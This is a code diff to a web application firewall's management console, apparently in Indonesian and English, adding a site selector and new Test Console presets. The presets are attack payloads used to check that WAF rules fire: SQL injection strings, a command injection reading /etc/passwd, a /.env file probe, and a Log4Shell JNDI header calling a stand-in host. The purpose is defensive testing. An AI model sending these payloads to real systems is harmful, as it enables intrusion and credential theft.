@@ -114,6 +114,8 @@ Object.assign(I18N.id, { lastHour: '1 jam terakhir', last6Hours: '6 jam terakhir
 Object.assign(I18N.zh, { lastHour: '最近 1 小时', last6Hours: '最近 6 小时', last24Hours: '最近 24 小时', last7Days: '最近 7 天', actionFilter: '操作筛选', timeRange: '时间范围', eventCount: '事件' });
 Object.assign(I18N.ar, { lastHour: 'آخر ساعة', last6Hours: 'آخر 6 ساعات', last24Hours: 'آخر 24 ساعة', last7Days: 'آخر 7 أيام', actionFilter: 'تصفية الإجراءات', timeRange: 'النطاق الزمني', eventCount: 'أحداث' });
 Object.assign(I18N.ja, { lastHour: '過去 1 時間', last6Hours: '過去 6 時間', last24Hours: '過去 24 時間', last7Days: '過去 7 日間', actionFilter: 'アクションフィルター', timeRange: '期間', eventCount: 'イベント' });
+Object.assign(I18N.en, { testListener: 'WAF listener', siteDisabledTest: 'This reverse-proxy site is disabled. The Website Offline response is expected.', nonWafErrorTest: 'No WAF rule was triggered. This response came from routing or the upstream application.', cleanNoAuditTest: 'The request passed without an audit event. This is normal for clean traffic when SecAuditEngine is set to RelevantOnly.' });
+Object.assign(I18N.id, { testListener: 'Listener WAF', siteDisabledTest: 'Situs reverse proxy ini dinonaktifkan. Respons Website Offline memang diharapkan.', nonWafErrorTest: 'Tidak ada rule WAF yang terpicu. Respons ini berasal dari routing atau aplikasi upstream.', cleanNoAuditTest: 'Request lolos tanpa audit event. Ini normal untuk trafik bersih ketika SecAuditEngine menggunakan RelevantOnly.' });
 Object.assign(I18N.en, { chartTotal:'Total', chartEvents:'events', chartAria:'Hourly security events chart' });
 Object.assign(I18N.id, { chartTotal:'Total', chartEvents:'event', chartAria:'Grafik event keamanan per jam' });
 Object.assign(I18N.zh, { chartTotal:'总计', chartEvents:'事件', chartAria:'每小时安全事件图表' });
@@ -2742,6 +2744,13 @@ function openSiteModal(site, sites) {
 
 const TEST_PRESETS = [
   {
+    label: 'SQL boolean bypass',
+    method: 'GET',
+    path: '/?id=3%20or%20%27a%27=%27a%27',
+    headers: '',
+    body: '',
+  },
+  {
     label: 'SQL Injection',
     method: 'GET',
     path: '/?id=1%20UNION%20SELECT%20password%20FROM%20users',
@@ -2770,6 +2779,27 @@ const TEST_PRESETS = [
     body: '',
   },
   {
+    label: 'Command injection',
+    method: 'GET',
+    path: '/?cmd=%3Bcat%20%2Fetc%2Fpasswd',
+    headers: '',
+    body: '',
+  },
+  {
+    label: 'Sensitive file',
+    method: 'GET',
+    path: '/.env',
+    headers: '',
+    body: '',
+  },
+  {
+    label: 'Log4Shell',
+    method: 'GET',
+    path: '/',
+    headers: 'X-Api-Version: ${jndi:ldap://example.invalid/a}',
+    body: '',
+  },
+  {
     label: 'JSON body',
     method: 'POST',
     path: '/api/login',
@@ -2787,6 +2817,16 @@ const TEST_PRESETS = [
 
 async function renderTest() {
   const view = document.getElementById('view');
+  let proxySites = [];
+  try {
+    const proxy = await api('/api/proxy');
+    proxySites = (proxy.sites || []).map((site) => {
+      const host = (site.hosts || []).find((item) => item !== '*') || 'localhost';
+      return { ...site, testHost: host };
+    });
+  } catch {
+    // Manual hostname testing remains available if reverse-proxy data cannot be loaded.
+  }
   view.innerHTML = `
     ${pageHead(
       'Test Console',
@@ -2796,8 +2836,11 @@ async function renderTest() {
       <div class="card">
         <div class="card-head"><div><h3>Request</h3><div class="sub">Dikirim dari manager ke WAF</div></div></div>
         <div class="card-body">
+          <div class="field" style="margin-bottom:16px">
+            <label>Test template</label>
           <div class="preset-list" style="margin-bottom:16px">
             ${TEST_PRESETS.map((preset, index) => `<button type="button" class="preset" data-preset="${index}">${esc(preset.label === 'Request normal' ? t('normalRequest') : preset.label)}</button>`).join('')}
+          </div>
           </div>
           <form id="testForm" class="form-grid">
             <div class="form-grid cols-2">
@@ -2815,9 +2858,14 @@ async function renderTest() {
               </div>
             </div>
             <div class="field">
-              <label for="testHost">Hostname virtual host</label>
-              <input id="testHost" type="text" placeholder="app.example.com (kosong = upstream default)" />
-              <span class="hint">Isi untuk menguji routing dan proteksi WAF situs tertentu.</span>
+              <label for="testSite">Reverse proxy site</label>
+              <select id="testSite">
+                <option value="">Default listener / upstream</option>
+                ${proxySites.map((site, index) => `<option value="${index}" ${index === 0 ? 'selected' : ''}>${esc(site.name)} · ${esc(site.testHost)} · ${site.tls?.enabled ? 'https' : 'http'}:${esc(site.listenPort || 8080)}${site.enabled === false ? ' · Offline' : ''}</option>`).join('')}
+                <option value="manual">Custom hostname…</option>
+              </select>
+              <input id="testHost" type="text" placeholder="app.example.com" hidden />
+              <span class="hint">The listener port and protocol are selected automatically from Reverse Proxy.</span>
             </div>
             <div class="field">
               <label for="testHeaders">${t('additionalHeaders')}</label>
@@ -2844,7 +2892,17 @@ async function renderTest() {
     </div>`;
 
   const form = document.getElementById('testForm');
-  form.querySelectorAll('[data-preset]').forEach((button) => {
+  const siteSelect = document.getElementById('testSite');
+  const hostInput = document.getElementById('testHost');
+  const syncTestSite = () => {
+    const manual = siteSelect.value === 'manual';
+    hostInput.hidden = !manual;
+    if (!manual) hostInput.value = siteSelect.value === '' ? '' : (proxySites[Number(siteSelect.value)]?.testHost || '');
+    if (manual) hostInput.focus();
+  };
+  siteSelect.addEventListener('change', syncTestSite);
+  syncTestSite();
+  view.querySelectorAll('[data-preset]').forEach((button) => {
     button.addEventListener('click', () => {
       const preset = TEST_PRESETS[Number(button.dataset.preset)];
       document.getElementById('testMethod').value = preset.method;
@@ -2875,6 +2933,9 @@ async function renderTest() {
           method: document.getElementById('testMethod').value,
           path,
           host: document.getElementById('testHost').value.trim(),
+            siteId: siteSelect.value !== '' && siteSelect.value !== 'manual'
+              ? proxySites[Number(siteSelect.value)]?.id
+              : null,
           headers,
           body: document.getElementById('testBody').value,
         },
@@ -2930,6 +2991,11 @@ function renderTestResult(result) {
         }
       </div>`;
   } else {
+    const noAuditMessage = result.request?.site?.enabled === false
+      ? t('siteDisabledTest')
+      : response.status >= 400
+        ? t('nonWafErrorTest')
+        : t('cleanNoAuditTest');
     auditHtml = `
       <div class="response-head">
         <span class="response-status ok">${response.status}</span>
@@ -2939,9 +3005,7 @@ function renderTestResult(result) {
         </div>
       </div>
       <div class="note">${icon('info')}
-        <div>Request lolos tanpa audit event. Ini normal untuk trafik bersih bila
-        <span class="mono">SecAuditEngine RelevantOnly</span>. Ubah ke <span class="mono">On</span> di Settings
-        untuk mencatat semua request.</div>
+        <div>${esc(noAuditMessage)}</div>
       </div>`;
   }
 
@@ -2969,6 +3033,8 @@ function renderTestResult(result) {
         <dl class="kv">
           <dt>Method</dt><dd class="mono">${esc(result.request?.method)}</dd>
           <dt>Path</dt><dd class="mono">${esc(result.request?.path)}</dd>
+          <dt>${t('testListener')}</dt><dd class="mono">${esc(result.request?.listener || '')}</dd>
+          ${result.request?.site ? `<dt>${t('virtualHost')}</dt><dd>${esc(result.request.site.name)}</dd>` : ''}
           <dt>Marker</dt><dd class="mono">${esc(result.marker)}</dd>
         </dl>
         <div class="code-head"><span class="file-name">Header yang dikirim</span></div>
